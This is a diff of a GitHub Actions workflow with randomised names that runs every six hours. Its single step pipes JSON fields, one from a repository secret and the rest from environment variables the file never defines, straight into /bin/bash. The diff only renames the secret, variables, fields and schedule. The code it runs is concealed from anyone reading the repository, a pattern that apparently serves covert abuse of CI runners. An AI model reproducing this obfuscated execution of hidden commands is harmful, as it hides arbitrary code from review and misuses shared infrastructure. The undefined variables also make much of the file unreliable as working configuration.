@@ -1,11 +1,10 @@
 name: oiuajfnak
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 1/6 * * *'
+    - cron: '55 5/6 * * *'
 
-jobs:  # 4472
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,13 +12,15 @@ jobs:  # 4472
       - uses: actions/checkout@v4
       - name: oiuajfnak
         env:
-          n8: ${{ secrets.n8 }}
+          mz22: ${{ secrets.mz22 }}
         run: |
-          echo $n8 | jq -r .megv23 | /bin/bash
-          echo $j211 | jq -r .tsbvb4735 | /bin/bash
-          echo $lrzef43107 | jq -r .hicna39 | /bin/bash
-          echo $obtxu80 | jq -r .zz7 | /bin/bash
-          echo $ugne118 | jq -r .auy85 | /bin/bash
-          echo $acxeb73988 | jq -r .lodr13677 | /bin/bash
-          echo $vjuh55814 | jq -r .bvp8917 | /bin/bash
+          echo $mz22 | jq -r .xpx023 | /bin/bash
+          echo $qdhk09641 | jq -r .pmmmv0577 | /bin/bash
+          echo $zgsyy41 | jq -r .dd26 | /bin/bash
+          echo $smugz4494 | jq -r .zw1336 | /bin/bash
+          echo $suj163 | jq -r .hrx98 | /bin/bash
+          echo $mre7 | jq -r .c232 | /bin/bash
+          echo $r71 | jq -r .zd963 | /bin/bash
+          echo $ck178 | jq -r .wqzgo975 | /bin/bash
+          echo $p69820 | jq -r .k03 | /bin/bash
 
